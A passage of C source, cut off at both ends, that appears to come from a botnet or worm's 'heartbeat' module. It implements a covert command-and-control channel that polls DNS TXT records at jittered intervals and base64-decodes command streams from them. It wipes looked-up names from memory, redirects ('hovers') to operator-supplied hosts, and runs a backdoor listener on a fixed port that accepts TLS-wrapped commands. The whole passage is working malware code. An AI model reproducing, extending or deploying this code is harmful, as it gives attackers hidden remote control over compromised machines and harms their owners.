	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
	const int ret = mbedtls_ssl_read(&ctx->ssl, (unsigned char*)buf, len);

	if (ret < 0 && prne_mbedtls_is_nberr(ret)) {
		errno = EAGAIN;
	}

	return ret;
}

static bool htbt_main_slv_pending_f (void *ioctx) {
	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
	return mbedtls_ssl_check_pending(&ctx->ssl) != 0;
}

static ssize_t htbt_main_slv_write_f (
	void *ioctx,
	const void *buf,
	const size_t len)
{
	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
	const int ret = mbedtls_ssl_write(&ctx->ssl, (unsigned char*)buf, len);

	if (ret < 0 && prne_mbedtls_is_nberr(ret)) {
		errno = EAGAIN;
	}

	return ret;
}

static bool htbt_main_slv_lm_acq_f (void *ioctx, const htbt_lmk_t v) {
	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
	return htbt_lm_acquire(ctx->parent, v);
}

static void htbt_main_slv_lm_rel_f (void *ioctx, const htbt_lmk_t v) {
	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;
	htbt_lm_release(ctx->parent, v);
}

static void htbt_main_slv_hover_f (
	void *ioctx,
	const prne_htbt_hover_t *hv,
	prne_htbt_status_code_t *status,
	int32_t *err)
{
	htbt_main_client_t *ctx = (htbt_main_client_t*)ioctx;

	if (ctx->hv_trace != NULL) {
		if (ctx->hv_trace->element >= HTBT_HOVER_MAX_REDIR) {
			*status = PRNE_HTBT_STATUS_LIMIT;
			*err = 0;
			return;
		}
		else {
			ctx->hv_trace->element += 1;
			ctx->hv_used = true;
		}
	}

	if (htbt_main_q_hover(ctx->parent, hv, ctx->hv_trace)) {
		*status = PRNE_HTBT_STATUS_OK;
		*err = 0;
	}
	else {
		*status = PRNE_HTBT_STATUS_ERRNO;
		*err = errno;
	}
}

static void htbt_main_srv_hover (
	prne_htbt_t *ctx,
	const htbt_hv_req_body_t *body)
{
	htbt_main_client_t c;

	c.parent = ctx;
	c.hv_trace = body->trace;
	htbt_init_slv_ctx(&c.slv);
	c.slv.ioctx = &c;
	c.slv.loopchk_f = htbt_main_slv_loopchk_f;
	c.slv.setup_f = htbt_main_slv_setup_f;
	c.slv.cleanup_f = htbt_main_slv_cleanup_f;
	c.slv.read_f = htbt_main_slv_read_f;
	c.slv.write_f = htbt_main_slv_write_f;
	c.slv.pending_f = htbt_main_slv_pending_f;
	c.slv.hover_f = htbt_main_slv_hover_f;
	c.slv.lm_acquire_f = htbt_main_slv_lm_acq_f;
	c.slv.lm_release_f = htbt_main_slv_lm_rel_f;
	c.slv.cbset = &ctx->param.cb_f;
	c.slv.rcb = ctx->param.rcb;
	c.slv.cb_ctx = ctx->param.cb_ctx;
	c.slv.cv.lock = &ctx->lock;
	c.slv.cv.cond = &ctx->cond;
	mbedtls_ssl_init(&c.ssl);
	c.fd = -1;
	c.hv_used = false;


// TRY
	if (!htbt_alloc_slv_iobuf(&c.slv)) {
		prne_dbgperr("htbt_alloc_slv_iobuf()");
		goto END;
	}
	if (mbedtls_ssl_setup(&c.ssl, ctx->param.main_ssl_conf) != 0) {
		prne_dbgperr("mbedtls_ssl_setup()");
		goto END;
	}
	mbedtls_ssl_set_bio(
		&c.ssl,
		&c.fd,
		prne_mbedtls_ssl_send_cb,
		prne_mbedtls_ssl_recv_cb,
		NULL);

	c.fd = htbt_main_do_connect(ctx, &body->msg);
	if (c.fd < 0) {
		prne_dbgperr("htbt_main_do_connect()");
		goto END;
	}
	c.slv.fd[0] = c.slv.fd[1] = c.fd;

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			HTBT_NT_MAIN"@%"PRIuPTR": starting slv@%"PRIuPTR"\n",
			(uintptr_t)ctx,
			(uintptr_t)&c.slv);
	}
	htbt_slv_entry(&c.slv);

	if (!c.hv_used) {
		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
		prne_llist_erase(&ctx->main.hover_req, c.hv_trace);
		pth_mutex_release(&ctx->main.lock);
	}

END:
	htbt_free_slv_ctx(&c.slv);
	mbedtls_ssl_free(&c.ssl);
	prne_close(c.fd);
}

static void *htbt_main_entry (void *p) {
	HTBT_INTP_CTX(p);
	htbt_req_slip_t *slip = NULL;

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(HTBT_NT_MAIN"@%"PRIuPTR": entry.\n", (uintptr_t)ctx);
	}

	if (ctx->lbd.pth != NULL) {
		pth_resume(ctx->lbd.pth);
	}
	if (ctx->cncp.pth != NULL) {
		pth_resume(ctx->cncp.pth);
	}

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			HTBT_NT_MAIN"@%"PRIuPTR": loop start.\n",
			(uintptr_t)ctx);
	}
	while (ctx->loop_flag) {
		prne_dbgtrap(pth_mutex_acquire(&ctx->main.lock, FALSE, NULL));
		if (ctx->main.req_q.head == NULL) {
			pth_cond_await(&ctx->main.cond, &ctx->main.lock, NULL);
		}
		if (ctx->main.req_q.head != NULL) {
			slip = (htbt_req_slip_t*)ctx->main.req_q.head->element;
			prne_llist_erase(&ctx->main.req_q, ctx->main.req_q.head);
		}
		pth_mutex_release(&ctx->main.lock);

		if (!ctx->loop_flag) {
			goto FREE;
		}
		if (slip == NULL) {
			continue;
		}

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
#if PRNE_DEBUG
			const char *op_str = prne_htbt_op_tostr(slip->op);
#endif
			prne_dbgpf(
				HTBT_NT_MAIN"@%"PRIuPTR": received req_slip@%"PRIuPTR" - %s.\n",
				(uintptr_t)ctx,
				(uintptr_t)slip,
				op_str != NULL ? op_str : "?");
		}
		switch (slip->op) {
		case PRNE_HTBT_OP_HOVER:
			htbt_main_srv_hover(ctx, (htbt_hv_req_body_t*)slip->body);
			break;
		default:
			if (PRNE_DEBUG) {
				prne_dbgpf(
					HTBT_NT_MAIN"@%"PRIuPTR": unimplemented op %d of "
					"req_slip@%"PRIuPTR".\n",
					(uintptr_t)ctx,
					slip->op,
					(uintptr_t)slip);
			}
		}

FREE:
		if (slip != NULL) {
			slip->free_f(slip->body);
			prne_free(slip->body);
			prne_free(slip);
			slip = NULL;
		}
	}
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			HTBT_NT_MAIN"@%"PRIuPTR": loop end.\n",
			(uintptr_t)ctx);
	}

	if (ctx->lbd.pth != NULL) {
		pth_join(ctx->lbd.pth, NULL);
		ctx->lbd.pth = NULL;
	}
	if (ctx->cncp.pth != NULL) {
		pth_join(ctx->cncp.pth, NULL);
		ctx->cncp.pth = NULL;
	}

	htbt_main_empty_req_q(ctx);
	prne_llist_clear(&ctx->main.hover_req);
	prne_close(ctx->lbd.fd);
	ctx->lbd.fd = -1;
	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(HTBT_NT_MAIN"@%"PRIuPTR": exit.\n", (uintptr_t)ctx);
	}

	return NULL;
}

static void htbt_cncp_scrub_names (prne_resolv_fut_t *fut) {
	if (fut == NULL) {
		return;
	}

	for (size_t i = 0; i < fut->rr_cnt; i += 1) {
		prne_memzero(fut->rr[i].name, prne_nstrlen(fut->rr[i].name));
	}
}

static bool htbt_cncp_slv_loopchk_f (void *ioctx) {
	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
	return ctx->parent->loop_flag;
}

static bool htbt_cncp_slv_setup_f (void *ioctx, pth_event_t ev) {
	return true;
}

static void htbt_cncp_slv_cleanup_f (void *ioctx, pth_event_t ev) {
	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;

	close(ctx->fd[0]);
	ctx->fd[0] = -1;
}

static ssize_t htbt_cncp_slv_read_f (
	void *ioctx,
	void *buf,
	const size_t len)
{
	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
	return read(ctx->fd[0], buf, len);
}

static ssize_t htbt_cncp_slv_write_f (
	void *ioctx,
	const void *buf,
	const size_t len)
{
	return len;
}

static bool htbt_cncp_slv_pending_f (void *ioctx) {
	return false;
}

static bool htbt_cncp_slv_lm_acq_f (void *ioctx, const htbt_lmk_t v) {
	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
	return htbt_lm_acquire(ctx->parent, v);
}

static void htbt_cncp_slv_lm_rel_f (void *ioctx, const htbt_lmk_t v) {
	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;
	htbt_lm_release(ctx->parent, v);
}

static void htbt_cncp_slv_hover_f (
	void *ioctx,
	const prne_htbt_hover_t *hv,
	prne_htbt_status_code_t *status,
	int32_t *err)
{
	htbt_cncp_client_t *ctx = (htbt_cncp_client_t*)ioctx;

	// Ignore HTBT_HOVER_MAX_REDIR
	if (htbt_main_q_hover(ctx->parent, hv, NULL)) {
		*status = PRNE_HTBT_STATUS_OK;
		*err = 0;
	}
	else {
		*status = PRNE_HTBT_STATUS_ERRNO;
		*err = errno;
	}
}

static void htbt_cncp_stream_slv (
	prne_htbt_t *ctx,
	prne_resolv_prm_t *prm,
	prne_pth_cv_t *cv,
	const uint_fast32_t len)
{
	pth_event_t ev = NULL, ev_time;
	htbt_cncp_client_t c;
	uint8_t m_buf[189];
	prne_iobuf_t trio;
	size_t declen;

	prne_init_iobuf(&trio);
	prne_iobuf_setextbuf(&trio, m_buf, sizeof(m_buf), 0);
	ev_time = pth_event(
		PTH_EVENT_TIME,
		prne_pth_tstimeout(HTBT_CNCP_STREAM_TIMEOUT));
	prne_assert(ev_time != NULL);

	c.parent = ctx;
	c.pth = NULL;
	c.fd[0] = c.fd[1] = -1;
	htbt_init_slv_ctx(&c.slv);

	if (pipe(c.fd) != 0 ||
		!prne_sck_fcntl(c.fd[0]) ||
		!prne_sck_fcntl(c.fd[1]))
	{
		prne_dbgperr("CNCP slave input channel");
		goto END;
	}

	c.slv.fd[0] = c.fd[0];
	c.slv.fd[1] = ctx->param.blackhole;
	c.slv.ioctx = &c;
	c.slv.loopchk_f = htbt_cncp_slv_loopchk_f;
	c.slv.setup_f = htbt_cncp_slv_setup_f;
	c.slv.cleanup_f = htbt_cncp_slv_cleanup_f;
	c.slv.read_f = htbt_cncp_slv_read_f;
	c.slv.write_f = htbt_cncp_slv_write_f;
	c.slv.pending_f = htbt_cncp_slv_pending_f;
	c.slv.hover_f = htbt_cncp_slv_hover_f;
	c.slv.lm_acquire_f = htbt_cncp_slv_lm_acq_f;
	c.slv.lm_release_f = htbt_cncp_slv_lm_rel_f;
	c.slv.cbset = &ctx->param.cb_f;
	c.slv.cb_ctx = ctx->param.cb_ctx;
	if (!htbt_alloc_slv_iobuf(&c.slv)) {
		prne_dbgperr("htbt_alloc_slv_iobuf()@CNCP");
		goto END;
	}
	c.slv.cv.lock = &ctx->lock;
	c.slv.cv.cond = &ctx->cond;

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			HTBT_NT_CNCP"@%"PRIuPTR": starting slv@%"PRIuPTR"\n",
			(uintptr_t)ctx,
			(uintptr_t)&c.slv);
	}

	c.pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_slv_entry, &c.slv);
	if (c.pth == NULL) {
		prne_dbgperr("pth_spawn()@CNCP");
		goto END;
	}

	for (uint_fast32_t i = 0; i < len; ) {
		prne_hex_tochar(prne_getmsb32(i, 0), ctx->cncp.txtrec + 0, true);
		prne_hex_tochar(prne_getmsb32(i, 1), ctx->cncp.txtrec + 2, true);
		prne_hex_tochar(prne_getmsb32(i, 2), ctx->cncp.txtrec + 4, true);
		prne_hex_tochar(prne_getmsb32(i, 3), ctx->cncp.txtrec + 6, true);

		if (!prne_resolv_prm_gettxtrec(
			ctx->param.resolv,
			ctx->cncp.txtrec,
			cv,
			prm))
		{
			prne_dbgperr("prne_resolv_prm_gettxtrec()@CNCP");
			goto END;
		}

		prne_dbgtrap(pth_mutex_acquire(cv->lock, FALSE, NULL));
		if (ctx->loop_flag) {
			// Will be notified by resolv or fin() caller
			pth_cond_await(cv->cond, cv->lock, ev_time);
		}
		pth_mutex_release(cv->lock);
		if (!ctx->loop_flag ||
			pth_event_status(ev_time) == PTH_STATUS_OCCURRED)
		{
			goto END;
		}

		htbt_cncp_scrub_names(prm->fut);
		if (prm->fut->qr == PRNE_RESOLV_QR_OK) {
			int f_ret;

			if (prm->fut->rr_cnt != 1) {
				prne_dbgpf(
					"%s: invalid number of TXT record\n",
					ctx->cncp.txtrec);
				goto END;
			}

			f_ret = mbedtls_base64_decode(
				trio.m + trio.len,
				trio.avail,
				&declen,
				prm->fut->rr[0].rd_data + 1,
				prm->fut->rr[0].rd_data[0]);
			if (f_ret < 0) {
				prne_dbgpf("* mbedtls_base64_decode()@CNCP: %d\n", f_ret);
				goto END;
			}
			if (PRNE_DEBUG) {
				if (PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
					prne_dbgpf(
						HTBT_NT_CNCP"@%"PRIuPTR": < %zu bytes: ",
						(uintptr_t)ctx,
						declen);
					for (size_t i = 0; i < declen; i += 1) {
						prne_dbgpf(
							"%02"PRIx8" ",
							trio.m[trio.len + i]);
					}
					prne_dbgpf("\n");
				}
				else if (PRNE_VERBOSE >= PRNE_VL_DBG0) {
					prne_dbgpf(
						HTBT_NT_CNCP"@%"PRIuPTR": < %zu bytes.\n",
						(uintptr_t)ctx,
						declen);
				}
			}
			prne_iobuf_shift(&trio, declen);

			while (trio.len > 0 && ctx->loop_flag) {
				pth_event_free(ev, FALSE);
				ev = pth_event(
					PTH_EVENT_FD |
						PTH_UNTIL_FD_WRITEABLE |
						PTH_UNTIL_FD_EXCEPTION,
					c.fd[1]);
				prne_assert(ev != NULL);

				prne_dbgtrap(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
				if (ctx->loop_flag) {
					pth_cond_await(&ctx->cond, &ctx->lock, ev);
				}
				pth_mutex_release(&ctx->lock);

				f_ret = write(c.fd[1], trio.m, trio.len);
				if (f_ret <= 0) {
					goto END;
				}
				prne_iobuf_shift(&trio, -f_ret);
			}

			i += 1;
		}
	}

END:
	prne_close(c.fd[1]);
	if (c.pth != NULL) {
		pth_join(c.pth, NULL);
	}

	pth_event_free(ev, FALSE);
	pth_event_free(ev_time, FALSE);
	prne_close(c.fd[0]);
	htbt_free_slv_ctx(&c.slv);
	prne_free_iobuf(&trio);
}

static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
	prne_resolv_prm_t prm;
	prne_pth_cv_t cv;

	prne_resolv_init_prm(&prm);
	cv.lock = &ctx->cncp.lock;
	cv.cond = &ctx->cncp.cond;
	cv.broadcast = false;

	if (!ctx->param.cb_f.cnc_txtrec(ctx->param.cb_ctx, ctx->cncp.txtrec)) {
		goto END;
	}
	ctx->cncp.txtrec[255] = 0;
	{
		const bool q_ret = prne_resolv_prm_gettxtrec(
			ctx->param.resolv,
			ctx->cncp.txtrec,
			&cv,
			&prm);
		prne_memzero(ctx->cncp.txtrec, sizeof(ctx->cncp.txtrec));
		if (!q_ret) {
			prne_dbgperr("prne_resolv_prm_gettxtrec()");
			goto END;
		}
	}

	prne_dbgtrap(pth_mutex_acquire(cv.lock, FALSE, NULL));
	if (ctx->loop_flag) {
		// Will be notified by resolv or fin() caller
		pth_cond_await(cv.cond, cv.lock, NULL);
	}
	pth_mutex_release(cv.lock);
	if (!ctx->loop_flag) {
		goto END;
	}

	if (prm.fut->qr == PRNE_RESOLV_QR_OK && prm.fut->rr_cnt > 0) {
		uint8_t len[4];

		htbt_cncp_scrub_names(prm.fut);
		{
			size_t idx;
			prne_resolv_rr_t *rr;
			size_t prefix_len;

			// Use whichever head (load balancing)
			if (mbedtls_ctr_drbg_random(
				ctx->param.ctr_drbg,
				(unsigned char *)&idx,
				sizeof(idx)) == 0)
			{
				idx = idx % prm.fut->rr_cnt;
			}
			else {
				idx = 0;
			}
			rr = prm.fut->rr + idx;

			// format: <uint32_t number of entries in hex><txt rec name suffix>
			// Parse header
			if (rr->rd_data[0] < 9) {
				prne_dbgpf("* TXTREC format error: insufficient length\n");
				goto END;
			}
			if (!prne_hex_fromstr((char*)rr->rd_data + 1, len + 0) ||
				!prne_hex_fromstr((char*)rr->rd_data + 3, len + 1) ||
				!prne_hex_fromstr((char*)rr->rd_data + 5, len + 2) ||
				!prne_hex_fromstr((char*)rr->rd_data + 7, len + 3))
			{
				prne_dbgpf("* TXTREC format error: invalid length string\n");
				goto END;
			}
			prefix_len = rr->rd_data[0] - 8;
			memcpy(ctx->cncp.txtrec + 8, rr->rd_data + 9, prefix_len);
			ctx->cncp.txtrec[8 + prefix_len] = 0;
		}

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				HTBT_NT_CNCP"@%"PRIuPTR": got CNC TXT REC - "
				"prefix=\"%s\", length=%"PRIu32"\n",
				(uintptr_t)ctx,
				ctx->cncp.txtrec + 8,
				(uint32_t)prne_recmb_msb32(len[0], len[1], len[2], len[3]));
		}

		htbt_cncp_stream_slv(
			ctx,
			&prm,
			&cv,
			prne_recmb_msb32(len[0], len[1], len[2], len[3]));
	}
	else {
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
#if PRNE_DEBUG
			const char *qrstr = prne_resolv_qr_tostr(prm.fut->qr);
			const char *rcstr = prne_resolv_rcode_tostr(prm.fut->status);
#endif
			prne_dbgpf(
				HTBT_NT_CNCP"@%"PRIuPTR": query failed - "
				"code=%s, status=%s, err=%d\n",
				(uintptr_t)ctx,
				qrstr != NULL ? qrstr : "?",
				rcstr != NULL ? rcstr : "?",
				prm.fut->err);

		}
	}

END:
	prne_memzero(ctx->cncp.txtrec, sizeof(ctx->cncp.txtrec));
	prne_resolv_free_prm(&prm);
}

static void *htbt_cncp_entry (void *p) {
	HTBT_INTP_CTX(p);
	unsigned long intvar;
	pth_event_t ev = NULL;
#if PRNE_DEBUG
	struct timespec sleep_start, sleep_end;
#endif

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(HTBT_NT_CNCP"@%"PRIuPTR": entry.\n", (uintptr_t)ctx);
	}

	while (ctx->loop_flag) {
		htbt_cncp_do_probe(ctx);

		// calc interval jitter
		intvar = 0; // ignore failure of mbedtls_ctr_drbg_random()
		mbedtls_ctr_drbg_random(
			ctx->param.ctr_drbg,
			(unsigned char*)&intvar,
			sizeof(intvar));
		intvar = HTBT_CNCP_INT_MIN + (intvar % HTBT_CNCP_INT_JIT);
		pth_event_free(ev, FALSE);
		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(prne_ms_timespec(intvar)));


		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				HTBT_NT_CNCP"@%"PRIuPTR": sleeping %lums.\n",
				(uintptr_t)ctx,
				intvar);
		}

		// wait
#if PRNE_DEBUG
		sleep_start = prne_gettime(CLOCK_MONOTONIC);
#endif
		prne_assert(ev != NULL); // fatal without timeout
		prne_dbgtrap(pth_mutex_acquire(&ctx->cncp.lock, FALSE, NULL));
		if (ctx->loop_flag) {
			pth_cond_await(&ctx->cncp.cond, &ctx->cncp.lock, ev);
		}
		pth_mutex_release(&ctx->cncp.lock);
#if PRNE_DEBUG
		sleep_end = prne_gettime(CLOCK_MONOTONIC);
#endif

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				HTBT_NT_CNCP"@%"PRIuPTR": slept %ldms.\n",
				(uintptr_t)ctx,
				prne_timespec_ms(prne_sub_timespec(sleep_end, sleep_start)));
		}
	}

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(HTBT_NT_CNCP"@%"PRIuPTR": exit.\n", (uintptr_t)ctx);
	}

	pth_event_free(ev, FALSE);
	return NULL;
}

static bool htbt_lbd_slv_loopchk_f (void *ioctx) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
	return ctx->parent->loop_flag;
}

static bool htbt_lbd_slv_setup_f (void *ioctx, pth_event_t ev) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;

	return
		prne_mbedtls_pth_handle(
			&ctx->ssl,
			mbedtls_ssl_handshake,
			ctx->fd,
			ev,
			NULL) &&
		prne_mbedtls_verify_alp(
			ctx->parent->param.lbd_ssl_conf,
			&ctx->ssl,
			PRNE_HTBT_TLS_ALP);
}

static void htbt_lbd_slv_cleanup_f (void *ioctx, pth_event_t ev) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;

	prne_mbedtls_pth_handle(
		&ctx->ssl,
		mbedtls_ssl_close_notify,
		ctx->fd,
		ev,
		NULL);
	prne_shutdown(ctx->fd, SHUT_RDWR);
}

static ssize_t htbt_lbd_slv_read_f (
	void *ioctx,
	void *buf,
	const size_t len)
{
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
	const int ret = mbedtls_ssl_read(&ctx->ssl, (unsigned char*)buf, len);

	if (ret < 0 && prne_mbedtls_is_nberr(ret)) {
		errno = EAGAIN;
	}

	return ret;
}

static ssize_t htbt_lbd_slv_write_f (
	void *ioctx,
	const void *buf,
	const size_t len)
{
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
	const int ret = mbedtls_ssl_write(&ctx->ssl, (unsigned char*)buf, len);

	if (ret < 0 && prne_mbedtls_is_nberr(ret)) {
		errno = EAGAIN;
	}

	return ret;
}

static bool htbt_lbd_slv_pending_f (void *ioctx) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
	return mbedtls_ssl_check_pending(&ctx->ssl) != 0;
}

static bool htbt_lbd_slv_lm_acq_f (void *ioctx, const htbt_lmk_t v) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
	return htbt_lm_acquire(ctx->parent, v);
}

static void htbt_lbd_slv_lm_rel_f (void *ioctx, const htbt_lmk_t v) {
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;
	htbt_lm_release(ctx->parent, v);
}

static void htbt_lbd_slv_hover_f (
	void *ioctx,
	const prne_htbt_hover_t *hv,
	prne_htbt_status_code_t *status,
	int32_t *err)
{
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ioctx;

	if (HTBT_HOVER_MAX_REDIR == 0) {
		*status = PRNE_HTBT_STATUS_LIMIT;
		*err = 0;
	}
	else if (htbt_main_q_hover(ctx->parent, hv, NULL)) {
		*status = PRNE_HTBT_STATUS_OK;
		*err = 0;
	}
	else {
		*status = PRNE_HTBT_STATUS_ERRNO;
		*err = errno;
	}
}

static void htbt_init_lbd_client (htbt_lbd_client_t *c) {
	c->pth = NULL;
	c->parent = NULL;
	htbt_init_slv_ctx(&c->slv);
	mbedtls_ssl_init(&c->ssl);
	c->fd = -1;
}

static bool htbt_alloc_lbd_client (
	htbt_lbd_client_t *c,
	const int fd,
	prne_htbt_t *parent)
{
	c->parent = parent;
	c->fd = c->slv.fd[0] = c->slv.fd[1] = fd;
	c->slv.ioctx = c;
	c->slv.loopchk_f = htbt_lbd_slv_loopchk_f;
	c->slv.setup_f = htbt_lbd_slv_setup_f;
	c->slv.cleanup_f = htbt_lbd_slv_cleanup_f;
	c->slv.read_f = htbt_lbd_slv_read_f;
	c->slv.write_f = htbt_lbd_slv_write_f;
	c->slv.pending_f = htbt_lbd_slv_pending_f;
	c->slv.hover_f = htbt_lbd_slv_hover_f;
	c->slv.lm_acquire_f = htbt_lbd_slv_lm_acq_f;
	c->slv.lm_release_f = htbt_lbd_slv_lm_rel_f;
	c->slv.cbset = &parent->param.cb_f;
	c->slv.rcb = parent->param.rcb;
	c->slv.cb_ctx = parent->param.cb_ctx;
	c->slv.cv.lock = &parent->lock;
	c->slv.cv.cond = &parent->cond;

	if (!htbt_alloc_slv_iobuf(&c->slv)) {
		return false;
	}

	if (mbedtls_ssl_setup(&c->ssl, parent->param.lbd_ssl_conf) != 0) {
		return false;
	}
	mbedtls_ssl_set_bio(
		&c->ssl,
		&c->fd,
		prne_mbedtls_ssl_send_cb,
		prne_mbedtls_ssl_recv_cb,
		NULL);

	c->pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_slv_entry, &c->slv);
	if (c->pth == NULL) {
		return false;
	}

	return true;
}

static void htbt_free_lbd_client (htbt_lbd_client_t *c) {
	if (c == NULL) {
		return;
	}

	if (c->pth != NULL) {
		pth_abort(c->pth);
	}
	htbt_free_slv_ctx(&c->slv);
	mbedtls_ssl_free(&c->ssl);
	prne_close(c->fd);
}

static void htbt_lbd_setup_loop (prne_htbt_t *ctx) {
	uint8_t m_sckaddr[prne_op_max(
		sizeof(struct sockaddr_in),
		sizeof(struct sockaddr_in6))];
	int optval;
	socklen_t sl;
	pth_event_t ev;

	while (ctx->loop_flag) {
		prne_memzero(m_sckaddr, sizeof(m_sckaddr));
		if ((ctx->lbd.fd = socket(AF_INET6, SOCK_STREAM, 0)) >= 0) {
			struct sockaddr_in6* sa = (struct sockaddr_in6*)m_sckaddr;

			sa->sin6_addr = in6addr_any;
			sa->sin6_family = AF_INET6;
			sa->sin6_port = HTBT_LBD_PORT;
			sl = sizeof(struct sockaddr_in6);
		}
		else if ((ctx->lbd.fd = socket(AF_INET, SOCK_STREAM, 0)) >= 0) {
			struct sockaddr_in* sa = (struct sockaddr_in*)m_sckaddr;

			sa->sin_addr.s_addr = INADDR_ANY;
			sa->sin_family = AF_INET;
			sa->sin_port = HTBT_LBD_PORT;
			sl = sizeof(struct sockaddr_in);
		}
		else {
			goto ERR;
		}
		if (!prne_sck_fcntl(ctx->lbd.fd)) {
			goto ERR;
		}
		optval = 1;
		setsockopt(
			ctx->lbd.fd,
			SOL_SOCKET,
			SO_REUSEADDR,
			&optval,
			sizeof(optval));
		if (bind(ctx->lbd.fd, (struct sockaddr*)m_sckaddr, sl) != 0) {
			goto ERR;
		}
		if (listen(ctx->lbd.fd, HTBT_LBD_BACKLOG) != 0) {
			goto ERR;
		}

		break;
ERR:
		prne_close(ctx->lbd.fd);
		ctx->lbd.fd = -1;

		ev = pth_event(
			PTH_EVENT_TIME,
			prne_pth_tstimeout(HTBT_LBD_BIND_INT));

		prne_dbgtrap(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
		if (ctx->loop_flag) {
			pth_cond_await(&ctx->cond, &ctx->lock, ev);
		}
		pth_mutex_release(&ctx->lock);

		pth_event_free(ev, FALSE);
	}
}

static void htbt_lbd_empty_conn_list (prne_htbt_t *ctx) {
	prne_llist_entry_t *ent = ctx->lbd.conn_list.head;
	htbt_lbd_client_t *client;

	while (ent != NULL) {
		client = (htbt_lbd_client_t*)ent->element;
		ent = ent->next;

		pth_join(client->pth, NULL);
		client->pth = NULL;

		htbt_free_lbd_client(client);
		prne_free(client);
	}
	prne_llist_clear(&ctx->lbd.conn_list);
}

static void htbt_lbd_serve_loop (prne_htbt_t *ctx) {
	int fret;
	pth_event_t ev = NULL;
	prne_llist_entry_t *ent;
	htbt_lbd_client_t *client;
	pth_attr_t attr;
	pth_state_t ths;
	struct pollfd pfd;

	while (ctx->loop_flag) {
		pth_event_free(ev, TRUE);
		ev = pth_event(
			PTH_EVENT_FD | PTH_UNTIL_FD_READABLE | PTH_UNTIL_FD_EXCEPTION,
			ctx->lbd.fd);
		prne_assert(ev != NULL);

		ent = ctx->lbd.conn_list.head;
		while (ent != NULL) {
			pth_event_t ev_sub = pth_event(
				PTH_EVENT_TID | PTH_UNTIL_TID_DEAD,
				((htbt_lbd_client_t*)ent->element)->pth);
			prne_assert(ev_sub != NULL);
			pth_event_concat(ev, ev_sub, NULL);

			ent = ent->next;
		}

		prne_dbgtrap(pth_mutex_acquire(&ctx->lock, FALSE, NULL));
		if (ctx->loop_flag) {
			pth_cond_await(&ctx->cond, &ctx->lock, ev);
		}
		pth_mutex_release(&ctx->lock);
		if (!ctx->loop_flag) {
			break;
		}

		ent = ctx->lbd.conn_list.head;
		while (ent != NULL) {
			client = (htbt_lbd_client_t*)ent->element;

			attr = pth_attr_of(client->pth);
			prne_assert(pth_attr_get(attr, PTH_ATTR_STATE, &ths));
			pth_attr_destroy(attr);

			if (ths == PTH_STATE_DEAD) {
				pth_join(client->pth, NULL);
				client->pth = NULL;

				htbt_free_lbd_client(client);
				prne_free(client);

				ent = prne_llist_erase(&ctx->lbd.conn_list, ent);
			}
			else {
				ent = ent->next;
			}
		}

		pfd.fd = ctx->lbd.fd;
		pfd.events = POLLIN;
		if (poll(&pfd, 1, 0) > 0) {
			if (!(pfd.revents & POLLIN)) {
				break;
			}

			fret = accept(ctx->lbd.fd, NULL, NULL);
			if (fret >= 0) {
				bool alloc;

				client = NULL;
				ent = NULL;
				do { // TRY
					if (!prne_sck_fcntl(fret)) {
						goto CATCH;
					}
					if (ctx->lbd.conn_list.size >= HTBT_LBD_MAX_CLIENTS) {
						goto CATCH;
					}

					client = (htbt_lbd_client_t*)prne_malloc(
						sizeof(htbt_lbd_client_t),
						1);
					if (client == NULL) {
						goto CATCH;
					}
					htbt_init_lbd_client(client);

					alloc = htbt_alloc_lbd_client(client, fret, ctx);
					fret = -1;
					if (!alloc) {
						goto CATCH;
					}

					ent = prne_llist_append(
						&ctx->lbd.conn_list,
						(prne_llist_element_t)client);
					if (ent == NULL) {
						goto CATCH;
					}

					break;
CATCH:				// CATCH
					if (ent != NULL) {
						prne_llist_erase(&ctx->lbd.conn_list, ent);
					}
					if (client != NULL) {
